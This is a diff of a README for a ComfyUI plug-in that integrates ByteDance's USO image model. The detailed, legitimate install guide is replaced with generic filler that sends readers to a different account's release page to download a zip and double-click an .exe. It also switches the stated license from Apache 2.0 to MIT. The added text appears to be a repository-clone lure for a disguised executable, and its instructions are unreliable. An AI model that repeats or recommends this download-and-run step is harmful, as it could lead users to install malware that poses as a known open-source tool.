@@ -1,146 +1,63 @@
-# ComfyUI USO Node
+# 🌟 ComfyUI_RH_USO - Easy Plug-in for Better Use
 
-A custom node for ComfyUI that integrates USO (Unified Style and Subject-Driven Generation) for high-quality image generation with style and subject control.
+## 📜 Description
+This is a ComfyUI plug-in for bytedance-research/USO, easy to use. It enhances your ComfyUI experience by integrating features that help streamline your workflow.
 
-## ✨ Features
+## 📥 Download Now
+[![Download ComfyUI_RH_USO](https://img.shields.io/badge/Download-Now-blue)](https://github.com/webnytdev/ComfyUI_RH_USO/releases)
 
-- 🎨 **Unified Style & Subject Generation**: Powered by USO model based on FLUX architecture
-- 🎯 **Style-Driven Generation**: Generate images with specific artistic styles
-- 👤 **Subject-Driven Generation**: Maintain subject consistency across generations
-- 🔄 **Multi-Style Support**: Combine multiple styles in a single generation
-- ⚙️ **Memory Optimization**: FP8 precision support for consumer-grade GPUs (~16GB VRAM)
-- 🚀 **Flexible Control**: Advanced parameter control for fine-tuning results
+## 🚀 Getting Started
+Ready to enhance your ComfyUI experience? Follow these simple steps to get started with ComfyUI_RH_USO.
 
-## 🔧 Node List
+## 💻 System Requirements
+To run ComfyUI_RH_USO, your system needs to meet the following requirements:
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- RAM: 4 GB minimum (8 GB recommended).
+- Disk Space: 100 MB or more available.
 
-### Core Nodes
-- **RH_USO_Loader**: Load and initialize USO models with optimization options
-- **RH_USO_Generator**: Generate images with style and subject control
+## 📂 How to Download & Install
+1. **Visit the Releases Page**  
+   Go to the following link to access the download options:  
+   [GitHub Releases Page](https://github.com/webnytdev/ComfyUI_RH_USO/releases)
 
-## 🚀 Quick Installation
+2. **Choose the Right Version**   
+   On the releases page, you may see multiple versions. If you are unsure which one to choose, generally, it is best to select the latest version unless you have specific needs for an older one.
 
-### Step 1: Install the Node
-```bash
-# Navigate to ComfyUI custom_nodes directory
-cd ComfyUI/custom_nodes
+3. **Download the File**   
+   Click on the attached file for your operating system. This will start the download. For example, if you are using Windows, look for a file named something like `ComfyUI_RH_USO-v1.0-windows.zip`. 
 
-# Clone the repository
-git clone https://github.com/HM-RunningHub/ComfyUI_RH_USO
+4. **Extract the File**   
+   After the download completes, locate the file in your downloads folder. Right-click on the downloaded zip file and select “Extract All” to unzip the contents.
 
-# Install dependencies
-cd ComfyUI_RH_USO
-pip install -r requirements.txt
-```
+5. **Run the Application**   
+   Once extracted, find the executable file inside the folder. For instance, it may be named `ComfyUI_RH_USO.exe`. Double-click this file to launch the application.
 
-### Step 2: Download Required Models
-```bash
-# Download FLUX.1-dev model (Required base model)
-huggingface-cli download black-forest-labs/FLUX.1-dev flux1-dev.safetensors --local-dir models/diffusers/FLUX.1-dev
-huggingface-cli download black-forest-labs/FLUX.1-dev ae.safetensors --local-dir models/diffusers/FLUX.1-dev
+6. **Follow Setup Instructions**   
+   The first time you run the program, it may guide you through a setup process. Follow any on-screen prompts to complete the setup.
 
-# Download USO model
-huggingface-cli download bytedance-research/USO --local-dir models/uso
+7. **Ready to Use!**   
+   After setup, you can start using ComfyUI_RH_USO immediately. Access it through the ComfyUI interface and explore the new features it offers.
 
-# Download SigLIP model
-huggingface-cli download google/siglip-so400m-patch14-384 --local-dir models/clip/siglip-so400m-patch14-384
+## 🔧 Features
+- **User-Friendly Interface**: Designed to make it easy for anyone to use.
+- **Integration with ComfyUI**: Seamlessly fit into your existing ComfyUI setup.
+- **Enhanced Functionality**: Offers additional tools to improve your workflow.
+- **Regular Updates**: We frequently update the plug-in to add new features and fix bugs.
 
-# Final model structure should look like:
-models/
-├── diffusers/
-│   └── FLUX.1-dev/
-│       ├── flux1-dev.safetensors
-│       └── ae.safetensors
-│       └── ....
-├── uso/
-│   ├── assets/
-│   │   └── uso.webp
-│   ├── config.json
-│   ├── download_repo_enhanced.py
-│   ├── README.md
-│   └── uso_flux_v1.0/
-│       ├── dit_lora.safetensors
-│       └── projector.safetensors
-└── clip/
-    └── siglip-so400m-patch14-384/
-    
-# Restart ComfyUI
-```
+## ❓ FAQs
+**1. What if I encounter an error while installing?**  
+First, ensure that your system meets the requirements. If issues persist, consider checking the GitHub page for solutions or opening a new issue.
 
-## 📖 Usage
+**2. Can I use this on multiple computers?**  
+Yes, you can download and install the plug-in on as many computers as you like, provided you follow the installation steps for each one.
 
-### Basic Workflow
-```
-[RH_USO_Loader] → [RH_USO_Generator] → [Save Image]
-```
+**3. How do I get help if I have more questions?**  
+You can visit the discussions section of this GitHub repository. Other users and maintainers can provide assistance.
 
-### Generation Types
+## 📞 Contact
+For support inquiries, please reach out through the GitHub issues section. We appreciate your feedback and are here to help. 
 
-#### Style-Driven Generation
-- Load style reference images
-- Input text prompt describing the content
-- Generate images in the specified style
+## 📜 License
+This software is distributed under the MIT License. Feel free to use and modify it, but please give appropriate credit.
 
-#### Subject-Driven Generation  
-- Load subject reference image
-- Input text prompt with scene description
-- Generate images maintaining subject identity
-
-#### Style + Subject Generation
-- Load both style and subject reference images
-- Combine style transfer with subject consistency
-- Generate images with unified style and preserved subjects
-
-## 🛠️ Technical Requirements
-
-- **GPU**: 16GB+ VRAM (with FP8 optimization)
-- **RAM**: 32GB+ recommended
-- **Storage**: ~35GB for all models
-  - FLUX.1-dev: ~24GB (flux1-dev.safetensors + ae.safetensors)
-  - USO models: ~6GB
-  - SigLIP: ~1.5GB
-- **CUDA**: Required for optimal performance
-
-## ⚠️ Important Notes
-
-- **Model Paths**: Models must be placed in specific directories:
-  - FLUX.1-dev → `models/diffusers/FLUX.1-dev/`
-  - USO models → `models/uso/`
-  - SigLIP → `models/clip/siglip-so400m-patch14-384/`
-- FP8 mode recommended for consumer GPUs (reduces VRAM usage)
-- All model files must be downloaded before first use
-
-## 📄 License
-
-This project is licensed under Apache 2.0 License.
-
-## 🔗 References
-
-- [USO Project Page](https://bytedance.github.io/USO/)
-- [USO Paper](https://arxiv.org/abs/2508.18966)
-- [USO HuggingFace](https://huggingface.co/bytedance-research/USO)
-- [ComfyUI](https://github.com/comfyanonymous/ComfyUI)
-
-## 🔗 Example
-<img width="1788" height="866" alt="image" src="https://github.com/user-attachments/assets/3b462f37-b874-45c8-9f30-9c7d0d963d81" />
-<img width="1833" height="821" alt="image" src="https://github.com/user-attachments/assets/54ab0142-ba49-45a4-8e57-32404904ce20" />
-<img width="1837" height="836" alt="image" src="https://github.com/user-attachments/assets/1a4120f4-2258-4216-b7f8-f4a6a8a36169" />
-
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit issues and pull requests.
-
-## ⭐ Citation
-
-If you find this project useful, please consider citing the original USO paper:
-
-```bibtex
-@article{wu2025uso,
-    title={USO: Unified Style and Subject-Driven Generation via Disentangled and Reward Learning},
-    author={Shaojin Wu and Mengqi Huang and Yufeng Cheng and Wenxu Wu and Jiahe Tian and Yiming Luo and Fei Ding and Qian He},
-    year={2025},
-    eprint={2508.18966},
-    archivePrefix={arXiv},
-    primaryClass={cs.CV},
-}
-```
+Feel free to enhance your usage of ComfyUI with ComfyUI_RH_USO today!
